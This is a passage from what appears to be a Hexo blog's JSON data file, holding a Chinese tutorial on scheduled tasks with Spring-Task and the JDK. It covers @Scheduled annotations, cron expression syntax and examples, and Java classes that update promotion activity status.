负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。\n</code></pre></li>\n</ol>\n"},{"title":"利用JDK和spring-task实现高可用定时任务","date":"2018-01-18T03:11:59.000Z","_content":"### 1. 定时任务框架简介：\n当前定时任务的实现方式主要有： 采用Quartz、Spring-Task、JDK、Zookeeper、Reids、Elastic-Job等。本文只介绍Spring-Task和JDK定时任务的使用。 主要是因为对于Java开发来说，这两个定时任务是不需要引入任何外部Jar包的，属于轻量级定时任务框架。当然，该文适合简单的定时任务，对于复杂的定时任务可采用定时任务调度服务器的方式进行实现。本文将以SpringBoot为框架，以动态维护活动开始和结束时间为例，介绍Spring-Task和JDK定时任务的实现。\n### 2. Spring-Task的使用：\n- App.java类中添加如下注解：\n\t\t\n\t\t\n\t\t@EnableAsync  \n\t\t@SpringBootApplication  \n\t\t@ComponentScan  \n\t\t@EnableAutoConfiguration  \n\t\t@EnableScheduling  \n\t\tpublic class App extends SpringBootServletInitializer {  \n\t\t    public static void main(String[] args) {  \n\t\t        SpringApplication.run(App.class, args);  \n\t\t    }  \n\t\t}  \n- 编写任务类ActivityTask.java\n\n\t\n\t\tpackage com.bldz.promotion.task;  \n\t\t\n\t\timport com.bldz.promotion.common.Constants;  \n\t\timport com.bldz.promotion.service.ActivityService;  \n\t\timport org.slf4j.Logger;  \n\t\timport org.slf4j.LoggerFactory;  \n\t\timport org.springframework.beans.factory.annotation.Autowired;  \n\t\timport org.springframework.scheduling.annotation.Scheduled;  \n\t\timport org.springframework.stereotype.Component;  \n\t\t\n\t\t/**\n\t\t * 更新活动时间  \n\t\t *\n\t\t * @author ZhangsunJiankun 2018年1月11日18:06:05  \n\t\t */\n\t\t@Component  \n\t\tpublic class ActivityTask {  \n\t\t\n\t\t    private final ActivityService activityService;  \n\t\t\n\t\t    private static Logger logger = LoggerFactory.getLogger  (ActivityTask.class);  \n\t\t\n\t\t    @Autowired  \n\t\t    public ActivityTask(ActivityService activityService) {  \n\t\t        this.activityService = activityService;  \n\t\t    }  \n\t\t\n\t\t    /**\n\t\t     * 更新活动开始时间  \n\t\t     */\n\t\t    @Scheduled(cron = \"0 0/5 * * * ?\")  \n\t\t    public void updateToHaving() {  \n\t\t        this.update(Constants.ACTIVITY_STATUS_HAVING);  \n\t\t    }  \n\t\t\n\t\t    /**\n\t\t     * 更新活动时间为已结束  \n\t\t     */\n\t\t    @Scheduled(cron = \"0 0/5 * * * ?\")  \n\t\t    public void updateToEnd() {  \n\t\t        this.update(Constants.ACTIVITY_STATUS_OVER);  \n\t\t    }  \n\t\t\n\t\t    private void update(String status) {  \n\t\t        if(Constants.ACTIVITY_STATUS_HAVING.equals(status)) {  \n\t\t            int items = activityService.updateStatusToHaving();  \n\t\t            if(items > 0) {  \n\t\t                logger.info(\"update activity status to having successfully!   Number of updates:{} \", items);  \n\t\t            }  \n\t\t        } else if(Constants.ACTIVITY_STATUS_OVER.equals(status)){  \n\t\t            int items = activityService.updateStatusToEnd();  \n\t\t            if(items > 0) {  \n\t\t                logger.info(\"update activity status to end successfully!   Number of updates:{} \", items);  \n\t\t            }  \n\t\t        } else {  \n\t\t            logger.error(\"update status error! status:{}\", status);  \n\t\t        }  \n\t\t    }  \n\t\t}  \n\n###### 至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\n\t\t@Schedule(String corn, Long fixedDelay, Long fixedRate, Long initialDelay, Long zone)\n\t\tcorn: 定时任务表达式\n\t\tfixedDelay: 以固定的频率，在最后一次调用的完成之后到下一此调用开始之间执行该方法 (以毫秒为单位)。\n\t\tinitialDelay: Spring容器启动之后第一次开始执行该Job的推迟时间\n\t\tfixedRate: 以固定的频率执行该方法\n\t\tzone: 服务器所在的时区\n###### corn表达式的使用\n\t\tCron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域（Spring-Task只支持6个域），每一个域代表一个含义，每一个域可出现的字符如下： \n\t\tSeconds:可出现\", - * /\"四个字符，有效范围为0-59的整数 \n\t\tMinutes:可出现\", - * /\"四个字符，有效范围为0-59的整数 \n\t\tHours:可出现\", - * /\"四个字符，有效范围为0-23的整数 \n\t\tDayofMonth:可出现\", - * / ? L W C\"八个字符，有效范围为0-31的整数 \n\t\tMonth:可出现\", - * /\"四个字符，有效范围为1-12的整数或JAN-DEc \n\t\tDayofWeek:可出现\", - * / ? L C #\"四个字符，有效范围为1-7的整数或SUN-SAT两个范围。1表示星期天，2表示星期一， 依次类推 \n\t\tYear:可出现\", - * /\"四个字符，有效范围为1970-2099年\n\t\t\n\t\t每一个域都使用数字，但还可以出现如下特殊字符，它们的含义是： \n\t\t(1)*：表示匹配该域的任意值，假如在Minutes域使用*, 即表示每分钟都会触发事件。\n\t\t(2)?:只能用在DayofMonth和DayofWeek两个域。它也匹配域的任意值，但实际不会。因为DayofMonth和DayofWeek会相互影响。例如想在每月的20日触发调度，不管20日到底是星期几，则只能使用如下写法： 13 13 15 20 * ?, 其中最后一位只能用？，而不能使用*，如果使用*表示不管星期几都会触发，实际上并不是这样。 \n\t\t(3)-:表示范围，例如在Minutes域使用5-20，表示从5分到20分钟每分钟触发一次 \n\t\t(4)/：表示起始时间开始触发，然后每隔固定时间触发一次，例如在Minutes域使用5/20,则意味着5分钟触发一次，而25，45等分别触发一次. \n\t\t(5),:表示列出枚举值值。例如：在Minutes域使用5,20，则意味着在5和20分每分钟触发一次。 \n\t\t(6)L:表示最后，只能出现在DayofWeek和DayofMonth域，如果在DayofWeek域使用5L,意味着在最后的一个星期四触发。 \n\t\t(7)W:表示有效工作日(周一到周五),只能出现在DayofMonth域，系统将在离指定日期的最近的有效工作日触发事件。例如：在 DayofMonth使用5W，如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份 \n\t\t(8)LW:这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。 \n\t\t(9)#:用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在4#2，表示某月的第二个星期三。\n\t\t\n\t\t举几个例子: \n\t\t0 0 2 1 * ? * 表示在每月的1日的凌晨2点调度任务 \n\t\t0 15 10 ? * MON-FRI 表示周一到周五每天上午10：15执行作业 \n\t\t0 15 10 ? 6L 2002-2006 表示2002-2006年的每个月的最后一个星期五上午10:15执行作\n\t\t0 0 10,14,16 * * ? 每天上午10点，下午2点，4点 \n\t\t0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 \n\t\t0 0 12 ? * WED 表示每个星期三中午12点 \n\t\t\"0 0 12 * * ?\" 每天中午12点触发 \n\t\t\"0 15 10 ? * *\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ?\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ? *\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ? 2005\" 2005年的每天上午10:15触发 \n\t\t\"0 * 14 * * ?\" 在每天下午2点到下午2:59期间的每1分钟触发 \n\t\t\"0 0/5 14 * * ?\" 在每天下午2点到下午2:55期间的每5分钟触发 \n\t\t\"0 0/5 14,18 * * ?\" 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 \n\t\t\"0 0-5 14 * * ?\" 在每天下午2点到下午2:05期间的每1分钟触发 \n\t\t\"0 10,44 14 ? 3 WED\" 每年三月的星期三的下午2:10和2:44触发 \n\t\t\"0 15 10 ? * MON-FRI\" 周一至周五的上午10:15触发 \n\t\t\"0 15 10 15 * ?\" 每月15日上午10:15触发 \n\t\t\"0 15 10 L * ?\" 每月最后一日的上午10:15触发 \n\t\t\"0 15 10 ? * 6L\" 每月的最后一个星期五上午10:15触发 \n\t\t\"0 15 10 ? * 6L 2002-2005\" 2002年至2005年的每月的最后一个星期五上午10:15触发 \n\t\t\"0 15 10 ? * 6#3\" 每月的第三个星期五上午10:15触发\n\n### 3. JDK定时时任务的实现：\n\n- 编写TaskUtil.java\n\n\t\n\t\tpackage com.bldz.promotion.common.utils;\n\t\t\n\t\timport com.google.common.util.concurrent.ThreadFactoryBuilder;\n\t\timport org.apache.commons.lang3.concurrent.BasicThreadFactory;\n\t\timport java.util.concurrent.*;\n\t\t\n\t\t/**\n\t\t * Description: 基于JDK的定时任务工具类\n\t\t *\n\t\t * @author Jiankun.Zhangsun 2018/1/11 17:20\n\t\t */\n\t\tpublic class TaskUtils {\n\t\t\n\t\t    private static ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(\"demo-pool-%d\").build();\n\t\t\n\t\t    public static void schedule(Runnable task, Long delayed, TimeUnit timeUnit) {\n\t\t        ScheduledExecutorService scheduleService = Executors.newScheduledThreadPool(5, threadFactory);\n\t\t        scheduleService.schedule(task, delayed, timeUnit);\n\t\t        scheduleService.shutdown();\n\t\t    }\n\t\t}\n\t\t\n\n\n- 编写StatusTask.java\n\n\n\t\tpackage com.bldz.promotion.task;\n\t\t\n\t\timport com.bldz.promotion.exceptions.PromotionException;\n\t\timport com.bldz.promotion.service.ActivityService;\n\t\timport org.slf4j.Logger;\n\t\timport org.slf4j.LoggerFactory;\n\t\t\n\t\t/**\n\t\t * Description:\n\t\t *\n\t\t * @author Jiankun.Zhangsun 2018/1/16 15:43\n\t\t */\n\t\tpublic class StatusTask implements Runnable {\n\t\t\n\t\t    private Logger logger = LoggerFactory.getLogger(StatusTask.class);\n\t\t\n\t\t    private ActivityService activityService;\n\t\t\n\t\t    private String status;\n\t\t\n\t\t    private String key;\n\t\t\n\t\t    public StatusTask(String status, String key, ActivityService activityService) {\n\t\t        this.status = status;\n\t\t        this.key = key;\n\t\t        this.activityService = activityService;\n\t\t    }\n\t\t\n\t\t    @Override\n\t\t    public void run() {\n\t\t        int update;\n\t\t        // 新线程中的异常不会在main线程中抛出来\n\t\t        try {\n\t\t            update = activityService.updateActivityStatus(key, status);\n\t\t        } catch (PromotionException e) {\n\t\t            logger.error(\"update activity status to \" + status + \" failed!! failed reason:{}\", e) ;\n\t\t            return;\n\t\t        }\n\t\t        if(update > 0) {\n\t\t            logger.info(\"update activity status to \" + status + \" successfully!!\");\n\t\t        } else {\n\t\t            logger.error(\"update activity status to \" + status + \" failed!! update key:{} failed reason:{}\", key, \"database error!\") ;\n\t\t        }\n\t\t    }\n\t\t}\n\n\n### 4. 总结\n\nSpring-Task和JDK都是JavaEE开发中常用到的，不需要额外引入，相对轻量级。 两者分别存在以下优缺点：\n1. @Schedule中所有参数都是常量，不支持变量，必须在容器启动的时候就开始执行；\n2. JDK中的定时任务，是通过重启一个线程去执行定时任务的，这个线程根据需求随时可以启动，其中的delay参数支持变量的方式；\n3. JDK中的定时任务如果宕机了，或者服务器重启了会停止执行，所以采用Spring-Task每5分钟执行一次进行保证定时任务的高可用。\n","source":"_posts/利用JDK和spring-task实现高可用定时任务.md","raw":"---\ntitle: 利用JDK和spring-task实现高可用定时任务\ndate: 2018-01-18 11:11:59\ntags: Schedule\n---\n### 1. 定时任务框架简介：\n当前定时任务的实现方式主要有： 采用Quartz、Spring-Task、JDK、Zookeeper、Reids、Elastic-Job等。本文只介绍Spring-Task和JDK定时任务的使用。 主要是因为对于Java开发来说，这两个定时任务是不需要引入任何外部Jar包的，属于轻量级定时任务框架。当然，该文适合简单的定时任务，对于复杂的定时任务可采用定时任务调度服务器的方式进行实现。本文将以SpringBoot为框架，以动态维护活动开始和结束时间为例，介绍Spring-Task和JDK定时任务的实现。\n### 2. Spring-Task的使用：\n- App.java类中添加如下注解：\n\t\t\n\t\t\n\t\t@EnableAsync  \n\t\t@SpringBootApplication  \n\t\t@ComponentScan  \n\t\t@EnableAutoConfiguration  \n\t\t@EnableScheduling  \n\t\tpublic class App extends SpringBootServletInitializer {  \n\t\t    public static void main(String[] args) {  \n\t\t        SpringApplication.run(App.class, args);  \n\t\t    }  \n\t\t}  \n- 编写任务类ActivityTask.java\n\n\t\n\t\tpackage com.bldz.promotion.task;  \n\t\t\n\t\timport com.bldz.promotion.common.Constants;  \n\t\timport com.bldz.promotion.service.ActivityService;  \n\t\timport org.slf4j.Logger;  \n\t\timport org.slf4j.LoggerFactory;  \n\t\timport org.springframework.beans.factory.annotation.Autowired;  \n\t\timport org.springframework.scheduling.annotation.Scheduled;  \n\t\timport org.springframework.stereotype.Component;  \n\t\t\n\t\t/**\n\t\t * 更新活动时间  \n\t\t *\n\t\t * @author ZhangsunJiankun 2018年1月11日18:06:05  \n\t\t */\n\t\t@Component  \n\t\tpublic class ActivityTask {  \n\t\t\n\t\t    private final ActivityService activityService;  \n\t\t\n\t\t    private static Logger logger = LoggerFactory.getLogger  (ActivityTask.class);  \n\t\t\n\t\t    @Autowired  \n\t\t    public ActivityTask(ActivityService activityService) {  \n\t\t        this.activityService = activityService;  \n\t\t    }  \n\t\t\n\t\t    /**\n\t\t     * 更新活动开始时间  \n\t\t     */\n\t\t    @Scheduled(cron = \"0 0/5 * * * ?\")  \n\t\t    public void updateToHaving() {  \n\t\t        this.update(Constants.ACTIVITY_STATUS_HAVING);  \n\t\t    }  \n\t\t\n\t\t    /**\n\t\t     * 更新活动时间为已结束  \n\t\t     */\n\t\t    @Scheduled(cron = \"0 0/5 * * * ?\")  \n\t\t    public void updateToEnd() {  \n\t\t        this.update(Constants.ACTIVITY_STATUS_OVER);  \n\t\t    }  \n\t\t\n\t\t    private void update(String status) {  \n\t\t        if(Constants.ACTIVITY_STATUS_HAVING.equals(status)) {  \n\t\t            int items = activityService.updateStatusToHaving();  \n\t\t            if(items > 0) {  \n\t\t                logger.info(\"update activity status to having successfully!   Number of updates:{} \", items);  \n\t\t            }  \n\t\t        } else if(Constants.ACTIVITY_STATUS_OVER.equals(status)){  \n\t\t            int items = activityService.updateStatusToEnd();  \n\t\t            if(items > 0) {  \n\t\t                logger.info(\"update activity status to end successfully!   Number of updates:{} \", items);  \n\t\t            }  \n\t\t        } else {  \n\t\t            logger.error(\"update status error! status:{}\", status);  \n\t\t        }  \n\t\t    }  \n\t\t}  \n\n###### 至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\n\t\t@Schedule(String corn, Long fixedDelay, Long fixedRate, Long initialDelay, Long zone)\n\t\tcorn: 定时任务表达式\n\t\tfixedDelay: 以固定的频率，在最后一次调用的完成之后到下一此调用开始之间执行该方法 (以毫秒为单位)。\n\t\tinitialDelay: Spring容器启动之后第一次开始执行该Job的推迟时间\n\t\tfixedRate: 以固定的频率执行该方法\n\t\tzone: 服务器所在的时区\n###### corn表达式的使用\n\t\tCron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域（Spring-Task只支持6个域），每一个域代表一个含义，每一个域可出现的字符如下： \n\t\tSeconds:可出现\", - * /\"四个字符，有效范围为0-59的整数 \n\t\tMinutes:可出现\", - * /\"四个字符，有效范围为0-59的整数 \n\t\tHours:可出现\", - * /\"四个字符，有效范围为0-23的整数 \n\t\tDayofMonth:可出现\", - * / ? L W C\"八个字符，有效范围为0-31的整数 \n\t\tMonth:可出现\", - * /\"四个字符，有效范围为1-12的整数或JAN-DEc \n\t\tDayofWeek:可出现\", - * / ? L C #\"四个字符，有效范围为1-7的整数或SUN-SAT两个范围。1表示星期天，2表示星期一， 依次类推 \n\t\tYear:可出现\", - * /\"四个字符，有效范围为1970-2099年\n\t\t\n\t\t每一个域都使用数字，但还可以出现如下特殊字符，它们的含义是： \n\t\t(1)*：表示匹配该域的任意值，假如在Minutes域使用*, 即表示每分钟都会触发事件。\n\t\t(2)?:只能用在DayofMonth和DayofWeek两个域。它也匹配域的任意值，但实际不会。因为DayofMonth和DayofWeek会相互影响。例如想在每月的20日触发调度，不管20日到底是星期几，则只能使用如下写法： 13 13 15 20 * ?, 其中最后一位只能用？，而不能使用*，如果使用*表示不管星期几都会触发，实际上并不是这样。 \n\t\t(3)-:表示范围，例如在Minutes域使用5-20，表示从5分到20分钟每分钟触发一次 \n\t\t(4)/：表示起始时间开始触发，然后每隔固定时间触发一次，例如在Minutes域使用5/20,则意味着5分钟触发一次，而25，45等分别触发一次. \n\t\t(5),:表示列出枚举值值。例如：在Minutes域使用5,20，则意味着在5和20分每分钟触发一次。 \n\t\t(6)L:表示最后，只能出现在DayofWeek和DayofMonth域，如果在DayofWeek域使用5L,意味着在最后的一个星期四触发。 \n\t\t(7)W:表示有效工作日(周一到周五),只能出现在DayofMonth域，系统将在离指定日期的最近的有效工作日触发事件。例如：在 DayofMonth使用5W，如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份 \n\t\t(8)LW:这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。 \n\t\t(9)#:用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在4#2，表示某月的第二个星期三。\n\t\t\n\t\t举几个例子: \n\t\t0 0 2 1 * ? * 表示在每月的1日的凌晨2点调度任务 \n\t\t0 15 10 ? * MON-FRI 表示周一到周五每天上午10：15执行作业 \n\t\t0 15 10 ? 6L 2002-2006 表示2002-2006年的每个月的最后一个星期五上午10:15执行作\n\t\t0 0 10,14,16 * * ? 每天上午10点，下午2点，4点 \n\t\t0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 \n\t\t0 0 12 ? * WED 表示每个星期三中午12点 \n\t\t\"0 0 12 * * ?\" 每天中午12点触发 \n\t\t\"0 15 10 ? * *\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ?\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ? *\" 每天上午10:15触发 \n\t\t\"0 15 10 * * ? 2005\" 2005年的每天上午10:15触发 \n\t\t\"0 * 14 * * ?\" 在每天下午2点到下午2:59期间的每1分钟触发 \n\t\t\"0 0/5 14 * * ?\" 在每天下午2点到下午2:55期间的每5分钟触发 \n\t\t\"0 0/5 14,18 * * ?\" 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 \n\t\t\"0 0-5 14 * * ?\" 在每天下午2点到下午2:05期间的每1分钟触发 \n\t\t\"0 10,44 14 ? 3 WED\" 每年三月的星期三的下午2:10和2:44触发 \n\t\t\"0 15 10 ? * MON-FRI\" 周一至周五的上午10:15触发 \n\t\t\"0 15 10 15 * ?\" 每月15日上午10:15触发 \n\t\t\"0 15 10 L * ?\" 每月最后一日的上午10:15触发 \n\t\t\"0 15 10 ? * 6L\" 每月的最后一个星期五上午10:15触发 \n\t\t\"0 15 10 ? * 6L 2002-2005\" 2002年至2005年的每月的最后一个星期五上午10:15触发 \n\t\t\"0 15 10 ? * 6#3\" 每月的第三个星期五上午10:15触发\n\n### 3. JDK定时时任务的实现：\n\n- 编写TaskUtil.java\n\n\t\n\t\tpackage com.bldz.promotion.common.utils;\n\t\t\n\t\timport com.google.common.util.concurrent.ThreadFactoryBuilder;\n\t\timport org.apache.commons.lang3.concurrent.BasicThreadFactory;\n\t\timport java.util.concurrent.*;\n\t\t\n\t\t/**\n\t\t * Description: 基于JDK的定时任务工具类\n\t\t *\n\t\t * @author Jiankun.Zhangsun 2018/1/11 17:20\n\t\t */\n\t\tpublic class TaskUtils {\n\t\t\n\t\t    private static ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(\"demo-pool-%d\").build();\n\t\t\n\t\t    public static void schedule(Runnable task, Long delayed, TimeUnit timeUnit) {\n\t\t        ScheduledExecutorService scheduleService = Executors.newScheduledThreadPool(5, threadFactory);\n\t\t        scheduleService.schedule(task, delayed, timeUnit);\n\t\t        scheduleService.shutdown();\n\t\t    }\n\t\t}\n\t\t\n\n\n- 编写StatusTask.java\n\n\n\t\tpackage com.bldz.promotion.task;\n\t\t\n\t\timport com.bldz.promotion.exceptions.PromotionException;\n\t\timport com.bldz.promotion.service.ActivityService;\n\t\timport org.slf4j.Logger;\n\t\timport org.slf4j.LoggerFactory;\n\t\t\n\t\t/**\n\t\t * Description:\n\t\t *\n\t\t * @author Jiankun.Zhangsun 2018/1/16 15:43\n\t\t */\n\t\tpublic class StatusTask implements Runnable {\n\t\t\n\t\t    private Logger logger = LoggerFactory.getLogger(StatusTask.class);\n\t\t\n\t\t    private ActivityService activityService;\n\t\t\n\t\t    private String status;\n\t\t\n\t\t    private String key;\n\t\t\n\t\t    public StatusTask(String status, String key, ActivityService activityService) {\n\t\t        this.status = status;\n\t\t        this.key = key;\n\t\t        this.activityService = activityService;\n\t\t    }\n\t\t\n\t\t    @Override\n\t\t    public void run() {\n\t\t        int update;\n\t\t        // 新线程中的异常不会在main线程中抛出来\n\t\t        try {\n\t\t            update = activityService.updateActivityStatus(key, status);\n\t\t        } catch (PromotionException e) {\n\t\t            logger.error(\"update activity status to \" + status + \" failed!! failed reason:{}\", e) ;\n\t\t            return;\n\t\t        }\n\t\t        if(update > 0) {\n\t\t            logger.info(\"update activity status to \" + status + \" successfully!!\");\n\t\t        } else {\n\t\t            logger.error(\"update activity status to \" + status + \" failed!! update key:{} failed reason:{}\", key, \"database error!\") ;\n\t\t        }\n\t\t    }\n\t\t}\n\n\n### 4. 总结\n\nSpring-Task和JDK都是JavaEE开发中常用到的，不需要额外引入，相对轻量级。 两者分别存在以下优缺点：\n1. @Schedule中所有参数都是常量，不支持变量，必须在容器启动的时候就开始执行；\n2. JDK中的定时任务，是通过重启一个线程去执行定时任务的，这个线程根据需求随时可以启动，其中的delay参数支持变量的方式；\n3. JDK中的定时任务如果宕机了，或者服务器重启了会停止执行，所以采用Spring-Task每5分钟执行一次进行保证定时任务的高可用。\n","slug":"利用JDK和spring-task实现高可用定时任务","published":1,"updated":"2018-01-19T13:20:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twv002wmfaho3mso07t","content":"<h3 id=\"1-定时任务框架简介：\"><a href=\"#1-定时任务框架简介：\" class=\"headerlink\" title=\"1. 定时任务框架简介：\"></a>1. 定时任务框架简介：</h3><p>当前定时任务的实现方式主要有： 采用Quartz、Spring-Task、JDK、Zookeeper、Reids、Elastic-Job等。本文只介绍Spring-Task和JDK定时任务的使用。 主要是因为对于Java开发来说，这两个定时任务是不需要引入任何外部Jar包的，属于轻量级定时任务框架。当然，该文适合简单的定时任务，对于复杂的定时任务可采用定时任务调度服务器的方式进行实现。本文将以SpringBoot为框架，以动态维护活动开始和结束时间为例，介绍Spring-Task和JDK定时任务的实现。</p>\n<h3 id=\"2-Spring-Task的使用：\"><a href=\"#2-Spring-Task的使用：\" class=\"headerlink\" title=\"2. Spring-Task的使用：\"></a>2. Spring-Task的使用：</h3><ul>\n<li>App.java类中添加如下注解：</li>\n</ul>\n<pre><code>@EnableAsync  \n@SpringBootApplication  \n@ComponentScan  \n@EnableAutoConfiguration  \n@EnableScheduling  \npublic class App extends SpringBootServletInitializer {  \n    public static void main(String[] args) {  \n        SpringApplication.run(App.class, args);  \n    }  \n}  \n</code></pre><ul>\n<li>编写任务类ActivityTask.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.task;  \n\nimport com.bldz.promotion.common.Constants;  \nimport com.bldz.promotion.service.ActivityService;  \nimport org.slf4j.Logger;  \nimport org.slf4j.LoggerFactory;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.scheduling.annotation.Scheduled;  \nimport org.springframework.stereotype.Component;  \n\n/**\n * 更新活动时间  \n *\n * @author ZhangsunJiankun 2018年1月11日18:06:05  \n */\n@Component  \npublic class ActivityTask {  \n\n    private final ActivityService activityService;  \n\n    private static Logger logger = LoggerFactory.getLogger  (ActivityTask.class);  \n\n    @Autowired  \n    public ActivityTask(ActivityService activityService) {  \n        this.activityService = activityService;  \n    }  \n\n    /**\n     * 更新活动开始时间  \n     */\n    @Scheduled(cron = &quot;0 0/5 * * * ?&quot;)  \n    public void updateToHaving() {  \n        this.update(Constants.ACTIVITY_STATUS_HAVING);  \n    }  \n\n    /**\n     * 更新活动时间为已结束  \n     */\n    @Scheduled(cron = &quot;0 0/5 * * * ?&quot;)  \n    public void updateToEnd() {  \n        this.update(Constants.ACTIVITY_STATUS_OVER);  \n    }  \n\n    private void update(String status) {  \n        if(Constants.ACTIVITY_STATUS_HAVING.equals(status)) {  \n            int items = activityService.updateStatusToHaving();  \n            if(items &gt; 0) {  \n                logger.info(&quot;update activity status to having successfully!   Number of updates:{} &quot;, items);  \n            }  \n        } else if(Constants.ACTIVITY_STATUS_OVER.equals(status)){  \n            int items = activityService.updateStatusToEnd();  \n            if(items &gt; 0) {  \n                logger.info(&quot;update activity status to end successfully!   Number of updates:{} &quot;, items);  \n            }  \n        } else {  \n            logger.error(&quot;update status error! status:{}&quot;, status);  \n        }  \n    }  \n}  \n</code></pre><h6 id=\"至此Spring-Task定时任务已经完成，是不是很简单-）-难点主要在于-Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\"><a href=\"#至此Spring-Task定时任务已经完成，是不是很简单-）-难点主要在于-Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\" class=\"headerlink\" title=\"至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\"></a>至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。</h6><pre><code>@Schedule(String corn, Long fixedDelay, Long fixedRate, Long initialDelay, Long zone)\ncorn: 定时任务表达式\nfixedDelay: 以固定的频率，在最后一次调用的完成之后到下一此调用开始之间执行该方法 (以毫秒为单位)。\ninitialDelay: Spring容器启动之后第一次开始执行该Job的推迟时间\nfixedRate: 以固定的频率执行该方法\nzone: 服务器所在的时区\n</code></pre><h6 id=\"corn表达式的使用\"><a href=\"#corn表达式的使用\" class=\"headerlink\" title=\"corn表达式的使用\"></a>corn表达式的使用</h6><pre><code>Cron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域（Spring-Task只支持6个域），每一个域代表一个含义，每一个域可出现的字符如下： \nSeconds:可出现&quot;, - * /&quot;四个字符，有效范围为0-59的整数 \nMinutes:可出现&quot;, - * /&quot;四个字符，有效范围为0-59的整数 \nHours:可出现&quot;, - * /&quot;四个字符，有效范围为0-23的整数 \nDayofMonth:可出现&quot;, - * / ? L W C&quot;八个字符，有效范围为0-31的整数 \nMonth:可出现&quot;, - * /&quot;四个字符，有效范围为1-12的整数或JAN-DEc \nDayofWeek:可出现&quot;, - * / ? L C #&quot;四个字符，有效范围为1-7的整数或SUN-SAT两个范围。1表示星期天，2表示星期一， 依次类推 \nYear:可出现&quot;, - * /&quot;四个字符，有效范围为1970-2099年\n\n每一个域都使用数字，但还可以出现如下特殊字符，它们的含义是： \n(1)*：表示匹配该域的任意值，假如在Minutes域使用*, 即表示每分钟都会触发事件。\n(2)?:只能用在DayofMonth和DayofWeek两个域。它也匹配域的任意值，但实际不会。因为DayofMonth和DayofWeek会相互影响。例如想在每月的20日触发调度，不管20日到底是星期几，则只能使用如下写法： 13 13 15 20 * ?, 其中最后一位只能用？，而不能使用*，如果使用*表示不管星期几都会触发，实际上并不是这样。 \n(3)-:表示范围，例如在Minutes域使用5-20，表示从5分到20分钟每分钟触发一次 \n(4)/：表示起始时间开始触发，然后每隔固定时间触发一次，例如在Minutes域使用5/20,则意味着5分钟触发一次，而25，45等分别触发一次. \n(5),:表示列出枚举值值。例如：在Minutes域使用5,20，则意味着在5和20分每分钟触发一次。 \n(6)L:表示最后，只能出现在DayofWeek和DayofMonth域，如果在DayofWeek域使用5L,意味着在最后的一个星期四触发。 \n(7)W:表示有效工作日(周一到周五),只能出现在DayofMonth域，系统将在离指定日期的最近的有效工作日触发事件。例如：在 DayofMonth使用5W，如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份 \n(8)LW:这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。 \n(9)#:用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在4#2，表示某月的第二个星期三。\n\n举几个例子: \n0 0 2 1 * ? * 表示在每月的1日的凌晨2点调度任务 \n0 15 10 ? * MON-FRI 表示周一到周五每天上午10：15执行作业 \n0 15 10 ? 6L 2002-2006 表示2002-2006年的每个月的最后一个星期五上午10:15执行作\n0 0 10,14,16 * * ? 每天上午10点，下午2点，4点 \n0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 \n0 0 12 ? * WED 表示每个星期三中午12点 \n&quot;0 0 12 * * ?&quot; 每天中午12点触发 \n&quot;0 15 10 ? * *&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ?&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ? *&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ? 2005&quot; 2005年的每天上午10:15触发 \n&quot;0 * 14 * * ?&quot; 在每天下午2点到下午2:59期间的每1分钟触发 \n&quot;0 0/5 14 * * ?&quot; 在每天下午2点到下午2:55期间的每5分钟触发 \n&quot;0 0/5 14,18 * * ?&quot; 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 \n&quot;0 0-5 14 * * ?&quot; 在每天下午2点到下午2:05期间的每1分钟触发 \n&quot;0 10,44 14 ? 3 WED&quot; 每年三月的星期三的下午2:10和2:44触发 \n&quot;0 15 10 ? * MON-FRI&quot; 周一至周五的上午10:15触发 \n&quot;0 15 10 15 * ?&quot; 每月15日上午10:15触发 \n&quot;0 15 10 L * ?&quot; 每月最后一日的上午10:15触发 \n&quot;0 15 10 ? * 6L&quot; 每月的最后一个星期五上午10:15触发 \n&quot;0 15 10 ? * 6L 2002-2005&quot; 2002年至2005年的每月的最后一个星期五上午10:15触发 